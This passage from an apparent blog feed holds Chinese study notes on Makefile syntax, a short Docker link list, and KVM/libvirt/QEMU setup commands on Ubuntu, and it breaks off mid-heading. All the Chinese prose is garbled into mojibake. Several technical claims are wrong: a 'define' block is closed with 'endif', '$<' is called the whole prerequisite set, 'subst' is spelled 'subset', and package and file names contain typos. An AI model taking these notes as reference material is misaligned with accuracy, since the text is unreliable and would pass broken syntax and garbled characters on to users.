title="Makefileç»„æˆ"></a>Makefileç»„æˆ</h3><ol><li>æ˜¾ç¤ºè§„åˆ™ï¼ŒæŒ‡å‡ºè¦ç”Ÿæˆçš„æ–‡ä»¶ã€æ–‡ä»¶çš„ä¾èµ–å’Œç”Ÿæˆçš„å‘½ä»¤ã€‚</li><li>éšæ™¦è§„åˆ™ï¼Œè‡ªåŠ¨æ¨å¯¼ã€‚</li><li>å˜é‡å®šä¹‰ï¼Œå¤šä¸ºå­—ç¬¦ä¸²ã€‚</li><li>æ–‡ä»¶æŒ‡ç¤ºï¼Œå¼•ç”¨å¦ä¸€ä¸ªmakefileï¼ŒæŒ‡å®šæœ‰æ•ˆéƒ¨åˆ†ï¼Œå®šä¹‰å¤šè¡Œå‘½ä»¤ã€‚</li><li>æ³¨é‡Šï¼Œ#</li></ol><hr><h3 id="æŒ‡å®šç‰¹å®šçš„Makefile"><a href="#æŒ‡å®šç‰¹å®šçš„Makefile" class="headerlink" title="æŒ‡å®šç‰¹å®šçš„Makefile"></a>æŒ‡å®šç‰¹å®šçš„Makefile</h3><pre><code class="hljs">make -f Make.linux</code></pre><p>æˆ–è€…</p><pre><code class="hljs">make â€”-file Make.ATX</code></pre><hr><h3 id="å¼•ç”¨å…¶ä»–Makefile"><a href="#å¼•ç”¨å…¶ä»–Makefile" class="headerlink" title="å¼•ç”¨å…¶ä»–Makefile"></a>å¼•ç”¨å…¶ä»–Makefile</h3><pre><code class="hljs">include filename</code></pre><p>å¦‚</p><pre><code class="hljs">include foo.make a.my b.my c.mk</code></pre><p>ä½¿ç”¨<code>-I</code>æˆ–<code>â€”-include-dir</code>å‚æ•°ï¼ŒæŒ‡å®šç›®å½•å¯»æ‰¾ã€‚</p><p>è®©makeä¸ç†ä¼šæ— æ³•è¯»å–çš„æ–‡ä»¶ï¼Œä»è€Œç»§ç»­æ‰§è¡Œ, æ·»åŠ <code>-</code></p><pre><code class="hljs">-include filename</code></pre><hr><h3 id="ç¯å¢ƒå˜é‡MAKEFILES"><a href="#ç¯å¢ƒå˜é‡MAKEFILES" class="headerlink" title="ç¯å¢ƒå˜é‡MAKEFILES"></a>ç¯å¢ƒå˜é‡MAKEFILES</h3><p>makeä¼šæŠŠè¿™ä¸ªå˜é‡çš„å€¼åšä¸€ä¸ªç±»ä¼¼includeçš„åŠ¨ä½œã€‚</p><hr><h2 id="3-ä¹¦å†™è§„åˆ™"><a href="#3-ä¹¦å†™è§„åˆ™" class="headerlink" title="3 ä¹¦å†™è§„åˆ™"></a>3 ä¹¦å†™è§„åˆ™</h2><p>å¯ä»¥æŠŠcommandå’Œå‰é¢çš„å†™æˆä¸€è¡Œ</p><pre><code class="hljs">targets : prerequisites ; command</code></pre><p>å‘½ä»¤æˆ–å…¶ä»–çš„å¥å­å¤ªé•¿å¯ä»¥ç”¨<code>\</code>åˆ†éš”æ¢è¡Œ</p><pre><code class="hljs">objects = main.o kid.o command.o display.o \insert.o search.o file.o utility.o</code></pre><p>ä¸€èˆ¬ï¼Œmakeä»¥<code>/bin/sh</code>æ‰§è¡Œå‘½ä»¤ã€‚</p><hr><h3 id="ä½¿ç”¨é€šé…ç¬¦"><a href="#ä½¿ç”¨é€šé…ç¬¦" class="headerlink" title="ä½¿ç”¨é€šé…ç¬¦"></a>ä½¿ç”¨é€šé…ç¬¦</h3><p>æ”¯æŒä¸‰ä¸ªé€šé…ç¬¦ï¼š<code>*</code>,<code>?</code>,<code>~</code></p><hr><h3 id="æ–‡ä»¶æœå¯»"><a href="#æ–‡ä»¶æœå¯»" class="headerlink" title="æ–‡ä»¶æœå¯»"></a>æ–‡ä»¶æœå¯»</h3><h4 id="VPATHå˜é‡"><a href="#VPATHå˜é‡" class="headerlink" title="VPATHå˜é‡"></a>VPATHå˜é‡</h4><p>Makefileä¸­çš„<code>VPATH</code>å˜é‡ï¼ŒæŒ‡å®šç›®å½•æŸ¥æ‰¾ï¼Œå½“makeåœ¨å½“å‰ç›®å½•ä¸­æ²¡æœ‰æŸ¥æ‰¾åˆ°æ—¶ï¼Œåˆ°æŒ‡å®šç›®å½•ä¸­æŸ¥æ‰¾</p><pre><code class="hljs">VPATH = src:../headers</code></pre><p>ä½¿ç”¨<code>:</code>åˆ†éš”ã€‚</p><h4 id="vpathå…³é”®å­—"><a href="#vpathå…³é”®å­—" class="headerlink" title="vpathå…³é”®å­—"></a>vpathå…³é”®å­—</h4><p>ä¸‰ç§ä½¿ç”¨æ–¹æ³•</p><ol><li>vpath <pattern> <directories></li><li>vpath <pattern></li><li>vpath</li></ol><p><pattern>éœ€åŒ…å«<code>%</code>å­—ç¬¦ï¼Œè¡¨ç¤º<br>åŒ¹é…0æˆ–å¤šä¸ªå­—ç¬¦ã€‚</p><h3 id="ä¼ªç›®æ ‡"><a href="#ä¼ªç›®æ ‡" class="headerlink" title="ä¼ªç›®æ ‡"></a>ä¼ªç›®æ ‡</h3><p>ä½¿ç”¨<code>.PHONY</code>æ˜¾å¼è¡¨æ˜å…¶ä¸º<code>ä¼ªç›®æ ‡</code>ï¼Œä½œç”¨æ˜¯é¿å…å’Œæ–‡ä»¶é‡åã€‚</p><pre><code class="hljs">.PHONY : cleanclean :    rm *.o temp    </code></pre><p>è¡¨æ˜è¦è¿è¡Œcleanå°±éœ€è¦æ‰§è¡Œ<code>make clean</code>.</p><p>ç›®æ ‡å’Œä¼ªç›®æ ‡éƒ½å¯ä»¥æˆä¸ºä¾èµ–ã€‚</p><hr><h3 id="å¤šç›®æ ‡"><a href="#å¤šç›®æ ‡" class="headerlink" title="å¤šç›®æ ‡"></a>å¤šç›®æ ‡</h3><p>å½“å¤šä¸ªç›®æ ‡ä¾èµ–äºåŒä¸€ä¸ªæ–‡ä»¶æ—¶ã€‚</p><p>ä½¿ç”¨è‡ªåŠ¨åŒ–å˜é‡<code>$@</code>, è¡¨ç¤ºå½“å‰è§„åˆ™ä¸­æ‰€æœ‰çš„ç›®æ ‡çš„é›†åˆã€‚</p><pre><code class="hljs">bigoutput little output: text.g    generate text.g -$(subset output,,$@) &gt; $@    </code></pre><p><code>$</code>è¡¨ç¤ºæ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼Œ<code>subset</code>æ˜¯å‡½æ•°åï¼Œ<code>output,,$@</code>æ˜¯å‚æ•°ã€‚</p><hr><h3 id="é™æ€æ¨¡å¼"><a href="#é™æ€æ¨¡å¼" class="headerlink" title="é™æ€æ¨¡å¼"></a>é™æ€æ¨¡å¼</h3><p>æ›´å®¹æ˜“å®šä¹‰å¤šç›®æ ‡çš„è§„åˆ™ã€‚</p><p>è¯­æ³•ï¼š</p><pre><code class="hljs">&lt;targets&gt;: &lt;target-pattern&gt;: &lt;prereq-patternn&gt;    &lt;command&gt;    </code></pre><p>å¦‚</p><pre><code class="hljs">objects = foo.o bar.o    all: $(objects)$(objects): %.o: %.c    $(CC) -c $(CFLAGS) $&lt; -o $@    </code></pre><p>ä¾èµ–çš„åç§°æ¥æºäºç›®æ ‡æ–‡ä»¶å‰çš„åç§°ã€‚</p><p>ä¸­é—´çš„<code>%.o</code>è¡¨ç¤ºç­›é€‰å°¾ç¼€ä¸º<code>.o</code>çš„ç›®æ ‡ã€‚</p><p><code>$&lt;</code>å’Œ<code>$@</code> æ˜¯è‡ªåŠ¨åŒ–å˜é‡ã€‚</p><p><code>$&lt;</code>è¡¨ç¤ºæ‰€æœ‰çš„ä¾èµ–ç›®æ ‡é›†(è¿™é‡Œæ˜¯foo.c bar.c).</p><p><code>$@</code>è¡¨ç¤ºæ‰€æœ‰çš„ç›®æ ‡é›†(è¿™é‡Œæ˜¯foo.o bar.o)</p><h3 id="è‡ªåŠ¨ç”Ÿæˆä¾èµ–"><a href="#è‡ªåŠ¨ç”Ÿæˆä¾èµ–" class="headerlink" title="è‡ªåŠ¨ç”Ÿæˆä¾èµ–"></a>è‡ªåŠ¨ç”Ÿæˆä¾èµ–</h3><p>ä½¿ç”¨GNU C&#x2F;C++ç¼–è¯‘å™¨çš„<code>-MM</code>é€‰é¡¹ã€‚</p><p><code>.d</code>æ–‡ä»¶åŒ…å«<code>.c</code>æ–‡ä»¶çš„ä¾èµ–å…³ç³»ã€‚</p><pre><code class="hljs">source = foo.c bar.cinclude $(source:.c=.d)</code></pre><p>åšæ›¿æ¢ï¼ŒæŠŠå˜é‡sourceä¸­æ‰€æœ‰ .c å­—ç¬¦ä¸²æ›¿æ¢ä¸º .d </p><h2 id="4-ä¹¦å†™å‘½ä»¤"><a href="#4-ä¹¦å†™å‘½ä»¤" class="headerlink" title="4 ä¹¦å†™å‘½ä»¤"></a>4 ä¹¦å†™å‘½ä»¤</h2><p>æ³¨é‡Šçš„ç¬¦å·æ˜¯<code>#</code>è¿™ä¸ªå’Œshellè„šæœ¬ä¸€æ ·é«˜ã€‚</p><p>make ä¸€èˆ¬ä½¿ç”¨ç¯å¢ƒå˜é‡SHELLä¸­å®šä¹‰çš„Shellæ¥æ‰§è¡Œã€‚</p><p>makeé»˜è®¤ç”±&#x2F;bin&#x2F;shæ‰§è¡Œã€‚</p><h3 id="æ˜¾ç¤ºå‘½ä»¤"><a href="#æ˜¾ç¤ºå‘½ä»¤" class="headerlink" title="æ˜¾ç¤ºå‘½ä»¤"></a>æ˜¾ç¤ºå‘½ä»¤</h3><p>ä½¿ç”¨<code>@</code>åœ¨å‘½ä»¤ä¹‹å‰ï¼Œå‘½ä»¤å°†ä¸ä¼šè¢«æ‰“å°åœ¨å±å¹•ä¸Šã€‚</p><p>è°ƒè¯•Makefileï¼Œä½¿ç”¨makeçš„<code>-n</code>æˆ–<code>â€”-just-print</code>å‚æ•°ï¼Œåªä¼šæ‰“å°å‘½ä»¤è€Œä¸ä¼šæ‰§è¡Œã€‚</p><p>makeçš„<code>-s</code>æˆ–<code>â€”-silent</code>æˆ–<code>â€”-quiet</code>å‚æ•°ï¼Œè¡¨ç¤ºç¦æ­¢å‘½ä»¤çš„æ˜¾ç¤ºã€‚</p><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><p>è®©åç»­å‘½ä»¤åœ¨å‰é¢èµ·ä½œç”¨ä¹‹åæ‰§è¡Œï¼Œè¦ç”¨åˆ†å·éš”ç¦»å¼€ã€‚</p><pre><code class="hljs">exec:    cd /home/hchen; pwd    </code></pre><h3 id="å‘½ä»¤å‡ºé”™"><a href="#å‘½ä»¤å‡ºé”™" class="headerlink" title="å‘½ä»¤å‡ºé”™"></a>å‘½ä»¤å‡ºé”™</h3><p>å¿½ç•¥å‘½ä»¤çš„å‡ºé”™, ä½¿ç”¨<code>-</code></p><pre><code class="hljs">clean:    â€”rm -f *.o    </code></pre><p>ä¹Ÿå¯ä»¥ä½¿ç”¨makeçš„å‚æ•°<code>-i</code>æˆ–<code>â€”-ignore-errors</code>.</p><p>æˆ–è€…ä½¿ç”¨<code>.IGNORE</code></p><p>ç»ˆæ­¢å‡ºé”™çš„è§„åˆ™ï¼Œç»§ç»­æ‰§è¡Œå…¶ä»–è§„åˆ™çš„å‚æ•°<code>-k</code>æˆ–<code>â€”-keep-going</code></p><h3 id="åµŒå¥—æ‰§è¡Œ"><a href="#åµŒå¥—æ‰§è¡Œ" class="headerlink" title="åµŒå¥—æ‰§è¡Œ"></a>åµŒå¥—æ‰§è¡Œ</h3><p>æ€»æ§Makefile.</p><p>SHELLå’ŒMAKEFLAGSå˜é‡æ€»æ˜¯ä¼šä¼ é€’ç»™ä¸‹å±‚ã€‚</p><p><code>-w</code>å’Œ<code>â€”-print-directory</code>å‚æ•°ï¼Œæ‰“å°ç›®å‰å·¥ä½œç›®å½•ä¿¡æ¯ã€‚p</p><h3 id="å®šä¹‰å‘½ä»¤åŒ…"><a href="#å®šä¹‰å‘½ä»¤åŒ…" class="headerlink" title="å®šä¹‰å‘½ä»¤åŒ…"></a>å®šä¹‰å‘½ä»¤åŒ…</h3><p>ä»¥<code>define</code>å¼€å¤´ï¼Œ<code>endif</code>ç»“æŸã€‚</p><pre><code class="hljs">define run-yaccyacc $(firstword $^)mv y.tab.c $@endif</code></pre><p>ä½¿ç”¨å‘½ä»¤åŒ…</p><pre><code class="hljs">foo.c: foo.y    $(run-yacc)    </code></pre><h2 id="5-ä½¿ç”¨å˜é‡"><a href="#5-ä½¿ç”¨å˜é‡" class="headerlink" title="5 ä½¿ç”¨å˜é‡"></a>5 ä½¿ç”¨å˜é‡</h2><p>Makefileä¸­å®šä¹‰çš„å˜é‡ç±»ä¼¼äºC&#x2F;C++ä¸­çš„å®ã€‚</p><p>å˜é‡å‘½åï¼Œå¯ä»¥åŒ…å«å­—ç¬¦ã€æ•°å­—ã€ä¸‹åˆ’çº¿(å¯ä»¥ç”¨æ•°å­—å¼€å¤´)ï¼Œä¸åº”è¯¥å«æœ‰ <code>: # =</code>æˆ–ç©ºå­—ç¬¦ã€‚å¤§å°å†™æ•æ„Ÿã€‚</p><p>ä½¿ç”¨<code>:=</code>æ“ä½œç¬¦ï¼Œå‰é¢çš„å˜é‡ä¸èƒ½ä½¿ç”¨åé¢çš„å˜é‡è¿‡ï¼Œé¿å…æ— é™é‡å¤å®šä¹‰ã€‚</p><p>æ³¨æ„æ³¨é‡Šç¬¦<code>#</code>çš„ç‰¹æ€§</p><pre><code class="hljs">dir := /foo/bar     #directory</code></pre><p>dirè¿™ä¸ªå˜é‡çš„å€¼æ˜¯<code>/foo/bar</code>åé¢è·Ÿäº†å››ä¸ªç©ºæ ¼ã€‚</p><p><code>?=</code>æ“ä½œç¬¦</p><pre><code class="hljs">FOO ?= bar</code></pre><p>å¦‚æœFOOæ²¡æœ‰è¢«å®šä¹‰ï¼Œé‚£ä¹ˆå…¶å€¼ä¸ºbarã€‚</p><h3 id="å˜é‡çš„é«˜çº§ç”¨æ³•"><a href="#å˜é‡çš„é«˜çº§ç”¨æ³•" class="headerlink" title="å˜é‡çš„é«˜çº§ç”¨æ³•"></a>å˜é‡çš„é«˜çº§ç”¨æ³•</h3><p>æ›¿æ¢ã€‚</p><p>æŠŠå˜é‡çš„å€¼å½“ä½œå˜é‡ã€‚</p><h3 id="è¿½åŠ å˜é‡å€¼"><a href="#è¿½åŠ å˜é‡å€¼" class="headerlink" title="è¿½åŠ å˜é‡å€¼"></a>è¿½åŠ å˜é‡å€¼</h3><p>ä½¿ç”¨<code>+=</code>.</p><hr><h3 id="overrideæŒ‡ç¤ºç¬¦"><a href="#overrideæŒ‡ç¤ºç¬¦" class="headerlink" title="overrideæŒ‡ç¤ºç¬¦"></a>overrideæŒ‡ç¤ºç¬¦</h3><hr><h2 id="makeçš„è¿è¡Œ"><a href="#makeçš„è¿è¡Œ" class="headerlink" title="makeçš„è¿è¡Œ"></a>makeçš„è¿è¡Œ</h2><p>ä¸€èˆ¬makefileä¸­éƒ½åŒ…å«äº†ç¼–è¯‘ã€å®‰è£…ã€æ‰“åŒ…ç­‰åŠŸèƒ½ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Make</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker å­¦ä¹ </title>
    <link href="/2022/08/25/Docker-%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/08/25/Docker-%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><a href="http://coolshell.cn/articles/17010.html">ç½‘åšå®¢1</a><br><a href="http://coolshell.cn/articles/17049.html">ç½‘åšå®¢2</a><br><a href="http://coolshell.cn/articles/17061.html">ç½‘åšå®¢3</a><br><a href="http://coolshell.cn/articles/17200.html">ç½‘åšå®¢4</a></p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>kvm, libvirt å’Œ qemu</title>
    <link href="/2022/08/25/kvm-libvirt-%E5%92%8C-qemu/"/>
    <url>/2022/08/25/kvm-libvirt-%E5%92%8C-qemu/</url>
    
    <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>KVM æ˜¯ Kernel base Virtual Machina çš„ç®€ç§°.</p><p>QEMU æ˜¯ quick emulator çš„ç®€ç§°.</p><h1 id="Ubuntu-ä¸Šä½¿ç”¨"><a href="#Ubuntu-ä¸Šä½¿ç”¨" class="headerlink" title="Ubuntu ä¸Šä½¿ç”¨"></a>Ubuntu ä¸Šä½¿ç”¨</h1><h2 id="æŸ¥çœ‹æ˜¯å¦æ”¯æŒè™šæ‹ŸåŒ–"><a href="#æŸ¥çœ‹æ˜¯å¦æ”¯æŒè™šæ‹ŸåŒ–" class="headerlink" title="æŸ¥çœ‹æ˜¯å¦æ”¯æŒè™šæ‹ŸåŒ–"></a>æŸ¥çœ‹æ˜¯å¦æ”¯æŒè™šæ‹ŸåŒ–</h2><p>ä½¿ç”¨:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ <span class="hljs-attribute">LC_ALL</span>=C lscpu |grep Virtualization<br></code></pre></td></tr></table></figure><p>è‹¥è¾“å‡º <code>Virtualization:         VT-x</code> å³å¯ã€‚</p><p>æˆ–:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ <span class="hljs-keyword">grep</span> -Eoc <span class="hljs-string">&#x27;(vmx|svm)&#x27;</span> <span class="hljs-regexp">/proc/</span>cpuinfo<br></code></pre></td></tr></table></figure><p>è¾“å‡ºå¤§äº0çš„æ•°å­—.</p><h2 id="æŸ¥çœ‹æ˜¯å¦æ”¯æŒç¡¬ä»¶åŠ é€Ÿ"><a href="#æŸ¥çœ‹æ˜¯å¦æ”¯æŒç¡¬ä»¶åŠ é€Ÿ" class="headerlink" title="æŸ¥çœ‹æ˜¯å¦æ”¯æŒç¡¬ä»¶åŠ é€Ÿ"></a>æŸ¥çœ‹æ˜¯å¦æ”¯æŒç¡¬ä»¶åŠ é€Ÿ</h2><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ sudo apt <span class="hljs-keyword">install</span> cpu-checker<br></code></pre></td></tr></table></figure><p>è¾“å…¥:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>kvm-ok<br></code></pre></td></tr></table></figure><p>è‹¥è¾“å‡ºä¸º:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">KVM acceleration can be used</span><br></code></pre></td></tr></table></figure><p>å³è¡¨æ˜æ”¯æŒã€‚</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> sudo apt install qemu qemu-kvm libvirt-deamon-<span class="hljs-keyword">system</span> libvirt-client virt-manager virtinst bridge-utils<br></code></pre></td></tr></table></figure><p>å®‰è£…è½¯ä»¶:</p><ul><li>qemu-kvm, ä¸º KVM ç®¡ç†ç¨‹åºæä¾›ç¡¬ä»¶ä»¿çœŸ</li><li>libvirt ç®¡ç†è™šæ‹Ÿæœºå’Œå…¶ä»–è™šæ‹ŸåŒ–åŠŸèƒ½çš„è½¯ä»¶é›†åˆ, å…¶åŒ…å«ä¸€ä¸ª API åº“ï¼Œä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ (libvirtd) å’Œä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…· (virsh)</li></ul><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>éœ€æŠŠé•œåƒæ–‡ä»¶æ”¾åœ¨ <code>/var/lib/libvirt/images</code> ä¸­ã€‚</p><p>éœ€è¦åœ¨ <code>virt-manager</code> ä¸­æ·»åŠ ä¸€ä¸ªå«åš <code>network</code> çš„ç½‘ç»œè¿æ¥ã€‚</p><p>å…ˆåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæœºç£ç›˜çš„é•œåƒ:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> qemu<span class="hljs-literal">-img</span> create <span class="hljs-operator">-f</span> qcow2 archlinux.qcow2 <span class="hljs-number">40</span>G<br></code></pre></td></tr></table></figure><p>é€šè¿‡è„šæœ¬åˆ›å»ºè™šæ‹Ÿæœº:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ sudo virt-install <span class="hljs-attr">--name</span> archlinux <span class="hljs-attr">--os-variant</span>=archlinux <span class="hljs-attr">--memory</span> <span class="hljs-number">4096</span> <span class="hljs-attr">--vcpus</span> <span class="hljs-number">2</span> <span class="hljs-attr">--disk</span> path=./archlinux<span class="hljs-selector-class">.qcow2</span>,size=<span class="hljs-number">20</span> <span class="hljs-attr">--cdrom</span>=/var/lib/libvirt/images/archlinux-<span class="hljs-number">2022.08</span>.<span class="hljs-number">05</span>-x86_64<span class="hljs-selector-class">.iso</span>  <span class="hljs-attr">--boot</span> loader=/usr/share/qemu/OVMF<span class="hljs-selector-class">.fd</span> <span class="hljs-attr">--virt-type</span> kvm <span class="hljs-attr">--network</span> network=network,bridge=virbr1<br></code></pre></td></tr></table></figure><p>éƒ¨åˆ†é€‰é¡¹è¯´æ˜:</p><ul><li>â€“name, åˆ›å»ºè™šæ‹Ÿæœºåç§°</li><li>â€“os-variant, åˆ›å»ºè™šæ‹Ÿæœºç±»å‹</li><li>â€“memory, è™šæ‹Ÿæœºçš„å†…å­˜å¤§å°</li><li>â€“vcpus, è™šæ‹Ÿæœºçš„ CPU æ•°é‡</li><li>â€“cdrom, è™šæ‹Ÿæœºçš„ CD, å¯æ¥ ISO é•œåƒè·¯å¾„</li><li>â€“disk path, æŒ‡å®šè™šæ‹Ÿæœºç¡¬ç›˜è·¯å¾„</li><li>â€“disk path, æŒ‡å®šè™šæ‹Ÿæœºç¡¬ç›˜å¤§å°ï¼Œå•ä½ä¸º G</li><li>â€“boot, æŒ‡å®šå¯åŠ¨çš„ BIOS, Archlinux åªæ”¯æŒ UEFI å¯åŠ¨</li><li>â€“virt-type, é€‰æ‹© hypervisor, å¦‚ kvm, qemu, xen ç­‰</li><li>â€“network, æ·»åŠ ç½‘å¡</li></ul><p>è‹¥é‡åˆ° <code>cannot access storage file (as uid:107, gid:107) permission denied</code> ç±»ä¼¼çš„æŠ¥é”™, ä¿®æ”¹ <code>/etc/libvirt/qemu.comf</code> æ–‡ä»¶ä¸­:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta"># user = <span class="hljs-string">&quot;root&quot;</span></span><br><br><span class="hljs-meta"># group = <span class="hljs-string">&quot;root&quot;</span></span><br></code></pre></td></tr></table></figure><p>æ”¹ä¸º:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span><br><span class="hljs-attribute">group</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span><br></code></pre></td></tr></table></figure><p>è‹¥é‡åˆ° <code>You will need to grant the &#39;libvirt-qemu&#39; user search permissions for the following directories</code> æŠ¥é”™ï¼Œæ˜¯ <code>libvirt-qemu</code> ç”¨æˆ·æ²¡æœ‰å½“å‰ qemu æ–‡ä»¶æ‰€åœ¨ä½ç½®ç”¨æˆ·çš„æƒé™ï¼Œå°† <code>libvirt-qemu</code> æ·»åŠ åˆ°å½“å‰çš„ç”¨æˆ·ç»„å³å¯, å³ä¿®æ”¹ <code>/etc/group</code> æ–‡ä»¶ã€‚</p><h2 id="æ­£å¼å®‰è£…æ³¨æ„"><a href="#æ­£å¼å®‰è£…æ³¨æ„" class="headerlink" title="æ­£å¼å®‰è£…æ³¨æ„"></a>æ­£å¼å®‰è£…æ³¨æ„</h2><p>è²Œä¼¼å¿…é¡»å¾—åˆ›å»º <code>/boot</code> åˆ†åŒºã€‚</p><h2 id="è¿›å…¥è™šæ‹Ÿæœºåçš„é…ç½®"><a href="#è¿›å…¥è™šæ‹Ÿæœºåçš„é…ç½®" class="headerlink" title="è¿›å…¥è™šæ‹Ÿæœºåçš„é…ç½®"></a>è¿›å…¥è™šæ‹Ÿæœºåçš„é…ç½®</h2><p>åœ¨è®¾ç½®é‡Œé¢æœç´¢ â€œDisplay Configurationâ€ å¯ä»¥ä¿®æ”¹åˆ†è¾¨ç‡ã€‚</p><h1 id="ArchWiki-ä¸­å…³äº-KVM-éƒ¨åˆ†"><a href="#ArchWiki-ä¸­å…³äº-KVM-éƒ¨åˆ†" class="headerlink" title="ArchWiki ä¸­å…³äº KVM éƒ¨åˆ†"></a>ArchWiki ä¸­å…³äº KVM éƒ¨åˆ†</h1><p><a href="https://wiki.archlinux.org/title/KVM">ArchWiki ç›¸å…³</a><br>KVM æ˜¯åŸºäºå†…æ ¸çš„è™šæ‹Ÿæœº, æ˜¯å†…ç½®äº Linux å†…æ ¸çš„ hypervisor.</p><p>KVM æ˜¯ QEMU çš„ä¸€ç§ç‰¹æ®Šçš„è¿è¡Œæ¨¡å¼, è¿™ç§æ¨¡å¼é€šè¿‡å†…æ ¸æ¨¡å—ä½¿ç”¨ CPU æ‰©å±•è¿›è¡Œè™šæ‹ŸåŒ–.</p><p>éœ€æ£€æŸ¥æ¨¡å—æ˜¯å¦åŠ è½½.</p><h2 id="Virtio-å‡†è™šæ‹ŸåŒ–"><a href="#Virtio-å‡†è™šæ‹ŸåŒ–" class="headerlink" title="Virtio å‡†è™šæ‹ŸåŒ–"></a>Virtio å‡†è™šæ‹ŸåŒ–</h2><p>å‡†è™šæ‹ŸåŒ–ä¸ºå®¢æˆ·æœºæä¾›äº†ä¸€ç§ä½¿ç”¨ä¸»æœºä¸Šè®¾å¤‡çš„å¿«é€Ÿæœ‰æ•ˆçš„é€šä¿¡æ–¹å¼.</p><p>KVM ä½¿ç”¨ Virto API ä½œä¸ºè™šæ‹Ÿæœºç®¡ç†ç¨‹åºå’Œå®¢æˆ·ç«¯ä¹‹é—´çš„è¿æ¥å±‚, ä¸ºè™šæ‹Ÿæœºæä¾›è™šæ‹ŸåŒ–è®¾å¤‡.</p><p>æ‰€æœ‰ Virtio è®¾å¤‡éƒ½åŒ…æ‹¬ä¸¤éƒ¨åˆ†, ä¸»æœºè®¾å¤‡å’Œå®¢æˆ·æœºé©±åŠ¨ç¨‹åº.</p><p>éœ€æ£€æŸ¥æ¨¡å—æ˜¯å¦åŠ è½½.</p><h1 id="ArchWiki-ä¸­å…³äº-QEMU-éƒ¨åˆ†"><a href="#ArchWiki-ä¸­å…³äº-QEMU-éƒ¨åˆ†" class="headerlink" title="ArchWiki ä¸­å…³äº QEMU éƒ¨åˆ†"></a>ArchWiki ä¸­å…³äº QEMU éƒ¨åˆ†</h1><p>Qemu æ˜¯ä¸€ä¸ªå¹¿æ³›ä½¿ç”¨çš„å¼€æºè®¡ç®—æœºæ¨¡æ‹Ÿå™¨å’Œè™šæ‹Ÿæœº.</p><p>ä½œä¸ºè™šæ‹Ÿæœºæ—¶, QEMU å¯ä»¥ä½¿ç”¨å…¶ä»–è™šæ‹Ÿæœºç®¡ç†ç¨‹åº (å¦‚ Xen æˆ– KVM) æ¥ä½¿ç”¨ CPU æ‰©å±• (HAV) è¿›è¡Œè™šæ‹ŸåŒ–. é€šè¿‡ä¸»æœº CPU ä¸Šç›´æ¥æ‰§è¡Œå®¢æˆ·æœºä»£ç æ¥è·å¾—æ¥è¿‘äºå®¿ä¸»æœºçš„æ€§èƒ½.</p><h2 id="å®‰è£…-1"><a href="#å®‰è£…-1" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>å®‰è£… <code>qemu</code> åŒ….</p><p>QEMU ä¸æä¾›ç®¡ç†è™šæ‹Ÿæœºçš„ GUI. ä¹Ÿä¸æä¾›åˆ›å»ºå…·æœ‰å·²ä¿å­˜è®¾ç½®çš„æŒä¹…è™šæ‹Ÿæœºçš„æ–¹æ³•, é™¤éå·²åˆ›å»ºè‡ªå®šä¹‰è„šæœ¬ä»¥å¯åŠ¨è™šæ‹Ÿæœº, å¦åˆ™å¿…é¡»åœ¨æ¯æ¬¡å¯åŠ¨æ—¶åœ¨å‘½ä»¤è¡Œä¸ŠæŒ‡å®šè™šæ‹Ÿæœºçš„æ‰€æœ‰å‚æ•°.</p><h2 id="åˆ›å»ºæ–°è™šæ‹Ÿç³»ç»Ÿ"><a href="#åˆ›å»ºæ–°è™šæ‹Ÿç³»ç»Ÿ" class="headerlink" title="åˆ›å»ºæ–°è™šæ‹Ÿç³»ç»Ÿ"></a>åˆ›å»ºæ–°è™šæ‹Ÿç³»ç»Ÿ</h2><h3 id="åˆ›å»ºç¡¬ç›˜é•œåƒ"><a href="#åˆ›å»ºç¡¬ç›˜é•œåƒ" class="headerlink" 